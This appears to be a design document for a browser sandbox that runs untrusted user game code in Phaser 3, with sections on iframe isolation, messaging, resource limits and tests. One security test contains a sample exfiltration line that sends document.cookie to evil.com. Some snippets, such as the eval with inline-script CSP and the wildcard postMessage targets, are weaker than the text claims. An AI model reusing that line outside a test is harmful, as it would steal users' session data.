# Game Runtime Sandbox

## Overview

Execute untrusted user-generated game code safely in the browser using multi-layer sandboxing. The runtime isolates code from the main application while providing a controlled API to Phaser 3.

**Threat Model:** Assume all user code is hostile. Defense in depth.

---

## Architecture

```
┌───────────────────────────────────────────────────────┐
│  Main App (SvelteKit)                                 │
│  - CodeMirror 6 Editor                                │
│  - UI Controls                                        │
│  - WebRTC Connection                                  │
│  ────────────────────────────────────────────────────│
│           postMessage API                             │
│  ────────────────────────────────────────────────────│
│  ┌─────────────────────────────────────────────────┐ │
│  │  Sandboxed iframe                               │ │
│  │  <iframe sandbox="allow-scripts">               │ │
│  │                                                  │ │
│  │  ┌───────────────────────────────────────────┐ │ │
│  │  │  Sandbox Runtime (sandbox-runtime.js)     │ │ │
│  │  │  - postMessage bridge                      │ │ │
│  │  │  - gameAPI implementation                  │ │ │
│  │  │  - Resource limits                         │ │ │
│  │  └─────────────────┬─────────────────────────┘ │ │
│  │                    │                            │ │
│  │  ┌─────────────────▼─────────────────────────┐ │ │
│  │  │  Phaser 3 Game Engine                     │ │ │
│  │  │  - Scene management                        │ │ │
│  │  │  - Sprite rendering                        │ │ │
│  │  │  - Physics (Arcade)                        │ │ │
│  │  └─────────────────┬─────────────────────────┘ │ │
│  │                    │                            │ │
│  │  ┌─────────────────▼─────────────────────────┐ │ │
│  │  │  User Game Code (game.js)                 │ │ │
│  │  │  - Validated & transformed                │ │ │
│  │  │  - Loop guards inserted                   │ │ │
│  │  │  - No direct Phaser access                │ │ │
│  │  └───────────────────────────────────────────┘ │ │
│  └─────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────┘
```

---

## Security Layers

### **Layer 1: iframe Sandbox**

```html
<iframe
  id="game-frame"
  sandbox="allow-scripts"
  csp="default-src 'none'; script-src 'self'; connect-src 'self' wss://yourdomain.com;"
  style="width: 800px; height: 600px; border: none;"
  srcdoc="<!-- Sandbox HTML -->"
></iframe>
```

**Sandbox Attributes:**
- `allow-scripts`: Required to run game code
- **NO** `allow-same-origin`: Prevents access to parent's origin
- **NO** `allow-top-navigation`: Can't redirect parent page
- **NO** `allow-forms`: Can't submit forms to parent
- **NO** `allow-popups`: Can't open new windows

**CSP (Content Security Policy):**
- `default-src 'none'`: Block everything by default
- `script-src 'self'`: Only run scripts from same origin (srcdoc)
- `connect-src 'self' wss://yourdomain.com`: Only our WebSocket
- `img-src 'self' data: blob:`: Allow game assets
- `media-src 'self' data: blob:`: Allow sounds

**Benefits:**
- Opaque origin: no localStorage, cookies, or indexedDB access
- Cannot access parent's DOM or variables
- Cannot make network requests (except allowed CSP)

---

### **Layer 2: postMessage API**

All communication between parent and iframe uses structured messages.

**Parent → iframe:**
```typescript
interface ParentMessage {
  type: 'LOAD_CODE' | 'PLAYER_INPUT' | 'STATE_UPDATE' | 'PAUSE' | 'RESUME';
  payload: any;
}

// Load game code
window.frames[0].postMessage({
  type: 'LOAD_CODE',
  payload: {
    code: validatedCode,
    assets: ['sprite1.png', 'sound1.mp3']
  }
}, '*');

// Send multiplayer state update
window.frames[0].postMessage({
  type: 'STATE_UPDATE',
  payload: {
    frame: 1234,
    players: [...],
    entities: [...]
  }
}, '*');
```

**iframe → Parent:**
```typescript
interface IframeMessage {
  type: 'READY' | 'INPUT' | 'STATE' | 'ERROR' | 'LOG' | 'HEARTBEAT';
  payload: any;
}

// Send player input to host
parent.postMessage({
  type: 'INPUT',
  payload: {
    playerId: 'abc123',
    keys: ['left', 'space'],
    frame: 1234
  }
}, '*');

// Host broadcasts game state
parent.postMessage({
  type: 'STATE',
  payload: {
    frame: 1234,
    players: [...]
  }
}, '*');

// Error occurred
parent.postMessage({
  type: 'ERROR',
  payload: {
    message: 'ReferenceError: x is not defined',
    stack: '...'
  }
}, '*');
```

**Message Validation:**
```typescript
window.addEventListener('message', (event) => {
  // Validate message structure
  if (!event.data || typeof event.data.type !== 'string') {
    console.warn('Invalid message format');
    return;
  }

  // Whitelist allowed message types
  const ALLOWED_TYPES = ['READY', 'INPUT', 'STATE', 'ERROR', 'LOG', 'HEARTBEAT'];
  if (!ALLOWED_TYPES.includes(event.data.type)) {
    console.warn('Unknown message type:', event.data.type);
    return;
  }

  // Handle message
  handleIframeMessage(event.data);
});
```

---

### **Layer 3: Restricted gameAPI**

User code NEVER accesses Phaser directly. Only through controlled `gameAPI` object.

**gameAPI Implementation (inside iframe):**

```javascript
// sandbox-runtime.js
const gameAPI = {
  // Resource limits
  _entities: [],
  _sounds: [],
  _maxEntities: 1000,
  _maxSounds: 10,
  _frameCounter: 0,
  _randomSeed: Date.now(),
  _isHost: false,

  // Seeded random (deterministic for multiplayer)
  random() {
    const x = Math.sin(this._randomSeed++) * 10000;
    return x - Math.floor(x);
  },

  // Frame counter (instead of Date.now())
  getFrame() {
    return this._frameCounter;
  },

  // Check if this player is the host
  isHost() {
    return this._isHost;
  },

  // Create sprite (limited)
  createSprite(type, x, y, config = {}) {
    if (this._entities.length >= this._maxEntities) {
      throw new Error(`Entity limit reached: ${this._maxEntities}`);
    }

    const sprite = phaserScene.add.sprite(x, y, type);
    sprite.setScale(config.scale || 1);
    sprite.setRotation(config.rotation || 0);

    this._entities.push({ type: 'sprite', ref: sprite });
    return sprite.id;
  },

  // Play sound (limited)
  playSound(name) {
    if (this._sounds.length >= this._maxSounds) {
      return; // Silently drop (don't throw)
    }

    const sound = phaserScene.sound.play(name);
    this._sounds.push(sound);

    // Auto-cleanup when sound ends
    sound.once('complete', () => {
      const idx = this._sounds.indexOf(sound);
      if (idx > -1) this._sounds.splice(idx, 1);
    });
  },

  // Send input to host
  sendInput(keys) {
    parent.postMessage({
      type: 'INPUT',
      payload: {
        playerId: localPlayerId,
        keys: keys,
        frame: this._frameCounter
      }
    }, '*');
  },

  // Get all player inputs (host collects these)
  getInputs() {
    return receivedInputs; // populated by postMessage handler
  },

  // Set game state (host only)
  setState(stateObj) {
    if (!this._isHost) {
      throw new Error('Only host can set state');
    }

    parent.postMessage({
      type: 'STATE',
      payload: {
        frame: this._frameCounter,
        state: stateObj
      }
    }, '*');
  },

  // Get current game state (clients receive from host)
  getState() {
    return currentState; // populated by postMessage handler
  },

  // Logging (for debugging)
  log(message) {
    parent.postMessage({
      type: 'LOG',
      payload: { message, timestamp: this._frameCounter }
    }, '*');
  },

  // Update callback
  onUpdate(callback) {
    phaserScene.events.on('update', () => {
      this._frameCounter++;
      try {
        callback();
      } catch (error) {
        parent.postMessage({
          type: 'ERROR',
          payload: {
            message: error.message,
            stack: error.stack
          }
        }, '*');
      }
    });
  },

  // Heartbeat (for watchdog)
  _sendHeartbeat() {
    parent.postMessage({ type: 'HEARTBEAT' }, '*');
  }
};

// Block access to raw Phaser
delete window.Phaser;
delete window.PIXI;

// Heartbeat every second
setInterval(() => gameAPI._sendHeartbeat(), 1000);
```

---

### **Layer 4: Runtime Watchdog**

Parent monitors iframe health and kills if unresponsive.

```typescript
class GameSandbox {
  private iframe: HTMLIFrameElement;
  private lastHeartbeat: number = Date.now();
  private watchdogInterval: NodeJS.Timer;
  private fpsHistory: number[] = [];

  constructor() {
    this.setupWatchdog();
  }

  setupWatchdog() {
    // Check heartbeat every 2 seconds
    this.watchdogInterval = setInterval(() => {
      const elapsed = Date.now() - this.lastHeartbeat;

      if (elapsed > 5000) {
        // No heartbeat for 5 seconds = frozen
        this.handleFrozenGame();
      }
    }, 2000);

    // Listen for heartbeats
    window.addEventListener('message', (event) => {
      if (event.data.type === 'HEARTBEAT') {
        this.lastHeartbeat = Date.now();
      }
    });
  }

  handleFrozenGame() {
    console.error('Game frozen, reloading...');

    // Kill iframe
    this.iframe.remove();

    // Show error to user
    showError('Game froze. Reloading...');

    // Reload after 1 second
    setTimeout(() => this.reload(), 1000);
  }

  // FPS monitoring
  trackFPS(fps: number) {
    this.fpsHistory.push(fps);

    // Keep last 10 seconds (600 frames @ 60fps)
    if (this.fpsHistory.length > 600) {
      this.fpsHistory.shift();
    }

    // Check average FPS
    const avgFPS = this.fpsHistory.reduce((a, b) => a + b, 0) / this.fpsHistory.length;

    if (avgFPS < 10 && this.fpsHistory.length >= 600) {
      // Game running at < 10 FPS for 10 seconds
      console.warn('Low FPS detected, suggesting reload');
      showWarning('Game is running slowly. Reload?');
    }
  }

  reload() {
    // Reload game with last saved code
    this.createIframe();
    this.loadCode(savedCode);
  }

  destroy() {
    clearInterval(this.watchdogInterval);
    this.iframe.remove();
  }
}
```

---

## Sandbox HTML Template

**srcdoc content:**

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; connect-src wss://yourdomain.com; img-src 'self' data: blob:; media-src 'self' data: blob:;">
  <style>
    * { margin: 0; padding: 0; }
    body { overflow: hidden; background: #000; }
    canvas { display: block; }
  </style>
</head>
<body>
  <div id="game"></div>

  <!-- Phaser 3 -->
  <script src="https://cdn.jsdelivr.net/npm/phaser@3.80.0/dist/phaser.min.js"></script>

  <!-- Sandbox Runtime -->
  <script>
    // gameAPI implementation (from above)
    const gameAPI = { /* ... */ };

    // Phaser config
    const config = {
      type: Phaser.AUTO,
      width: 800,
      height: 600,
      parent: 'game',
      physics: {
        default: 'arcade',
        arcade: { gravity: { y: 0 }, debug: false }
      },
      scene: {
        preload: preload,
        create: create,
        update: update
      }
    };

    const game = new Phaser.Game(config);
    let phaserScene;

    function preload() {
      phaserScene = this;
      // Preload assets sent by parent
      receivedAssets.forEach(asset => {
        if (asset.type === 'image') {
          this.load.image(asset.name, asset.url);
        } else if (asset.type === 'audio') {
          this.load.audio(asset.name, asset.url);
        }
      });
    }

    function create() {
      phaserScene = this;

      // Listen for code loading
      window.addEventListener('message', (event) => {
        if (event.data.type === 'LOAD_CODE') {
          try {
            // Execute user code
            eval(event.data.payload.code);

            // Notify parent ready
            parent.postMessage({ type: 'READY' }, '*');
          } catch (error) {
            parent.postMessage({
              type: 'ERROR',
              payload: {
                message: error.message,
                stack: error.stack
              }
            }, '*');
          }
        }
      });

      // Notify parent iframe is ready
      parent.postMessage({ type: 'READY' }, '*');
    }

    function update() {
      // Game loop runs here (user code calls gameAPI.onUpdate)
    }

    // Block dangerous APIs
    delete window.fetch;
    delete window.XMLHttpRequest;
    delete window.WebSocket;
    delete window.localStorage;
    delete window.sessionStorage;
    delete window.indexedDB;
    delete window.location;
    delete window.document.cookie;
  </script>
</body>
</html>
```

---

## Hot Reload Implementation

When user edits code and presses Ctrl+S:

```typescript
async function hotReload(newCode: string) {
  // 1. Validate new code
  const validation = validateAST(newCode);
  if (!validation.valid) {
    showError(validation.errors.join('\n'));
    return;
  }

  // 2. Transform (loop guards)
  const transformed = transformCode(newCode);

  // 3. Save to Supabase
  await supabase
    .from('files')
    .update({ content: transformed, updated_at: new Date() })
    .eq('project_id', projectId);

  // 4. Send to iframe
  gameFrame.contentWindow.postMessage({
    type: 'LOAD_CODE',
    payload: { code: transformed }
  }, '*');

  // 5. Show success toast
  showToast('Code reloaded');
}

// Listen for Ctrl+S
editor.addCommand(monaco.KeyMod.CtrlCmd | monaco.KeyCode.KeyS, () => {
  const code = editor.getValue();
  hotReload(code);
});
```

---

## Error Handling

### Runtime Errors

**Capture in sandbox:**
```javascript
window.addEventListener('error', (event) => {
  parent.postMessage({
    type: 'ERROR',
    payload: {
      message: event.message,
      filename: event.filename,
      lineno: event.lineno,
      colno: event.colno,
      stack: event.error?.stack
    }
  }, '*');

  // Don't let error propagate
  event.preventDefault();
});
```

**Display in parent:**
```svelte
<script>
let gameError = null;

function handleIframeMessage(data) {
  if (data.type === 'ERROR') {
    gameError = data.payload;
    // Pause game
    pauseGame();
  }
}
</script>

{#if gameError}
  <div class="error-overlay">
    <h3>⚠️ Game Error</h3>
    <p>{gameError.message}</p>
    <pre>{gameError.stack}</pre>
    <button on:click={() => askAIToFix()}>
      Ask AI to Fix
    </button>
    <button on:click={() => gameError = null}>
      Edit Code
    </button>
    <button on:click={() => reloadGame()}>
      Reload
    </button>
  </div>
{/if}
```

---

## Resource Limits

### Memory Management

```javascript
// Track entity count
gameAPI._entityCount = 0;
const MAX_ENTITIES = 1000;

gameAPI.createSprite = function(type, x, y) {
  if (this._entityCount >= MAX_ENTITIES) {
    throw new Error(`Cannot create more than ${MAX_ENTITIES} entities`);
  }

  this._entityCount++;
  // ... create sprite
};

gameAPI.destroySprite = function(spriteId) {
  // ... destroy sprite
  this._entityCount--;
};

// Periodic cleanup
setInterval(() => {
  // Remove sprites outside game bounds
  phaserScene.children.each(sprite => {
    if (sprite.x < -100 || sprite.x > 900 ||
        sprite.y < -100 || sprite.y > 700) {
      sprite.destroy();
      gameAPI._entityCount--;
    }
  });
}, 5000);
```

### Texture Size Limits

```javascript
function preloadAsset(url, name, type) {
  // Check file size before loading
  fetch(url, { method: 'HEAD' })
    .then(response => {
      const size = parseInt(response.headers.get('content-length'));
      if (size > 5 * 1024 * 1024) { // 5MB limit
        throw new Error(`Asset ${name} exceeds 5MB limit`);
      }

      // Load asset
      if (type === 'image') {
        phaserScene.load.image(name, url);
      }
    })
    .catch(error => {
      parent.postMessage({
        type: 'ERROR',
        payload: { message: error.message }
      }, '*');
    });
}
```

---

## Testing

### Security Tests

```typescript
describe('Sandbox Security', () => {
  it('should block access to localStorage', () => {
    const maliciousCode = `
      localStorage.setItem('test', 'data');
    `;

    loadCodeInSandbox(maliciousCode);
    expect(getLastError()).toContain('localStorage is not defined');
  });

  it('should block network requests', () => {
    const maliciousCode = `
      fetch('https://evil.com/steal?data=' + document.cookie);
    `;

    loadCodeInSandbox(maliciousCode);
    expect(getLastError()).toContain('fetch is not defined');
  });

  it('should terminate infinite loops', async () => {
    const maliciousCode = `
      while (true) { /* hang */ }
    `;

    loadCodeInSandbox(maliciousCode);
    await wait(6000); // Watchdog timeout
    expect(isSandboxKilled()).toBe(true);
  });

  it('should enforce entity limits', () => {
    const code = `
      for (let i = 0; i < 2000; i++) {
        gameAPI.createSprite('test', 0, 0);
      }
    `;

    loadCodeInSandbox(code);
    expect(getLastError()).toContain('Entity limit reached');
  });
});
```

### Performance Tests

```typescript
describe('Hot Reload Performance', () => {
  it('should reload in under 5 seconds', async () => {
    const start = Date.now();
    await hotReload(sampleCode);
    const elapsed = Date.now() - start;

    expect(elapsed).toBeLessThan(5000);
  });

  it('should maintain 60 FPS', async () => {
    loadCodeInSandbox(heavyGameCode);
    await wait(10000);

    const avgFPS = getAverageFPS();
    expect(avgFPS).toBeGreaterThan(55);
  });
});
```

---

## Future Enhancements (Post-MVP)

- **Web Workers:** Run game logic in separate thread for true non-blocking
- **WASM sandboxing:** Compile JS to WASM for stricter isolation
- **GPU limits:** Prevent shader bombs (malicious WebGL)
- **Network bandwidth limits:** Throttle postMessage rate
- **Debugging tools:** Source maps, breakpoints, step-through
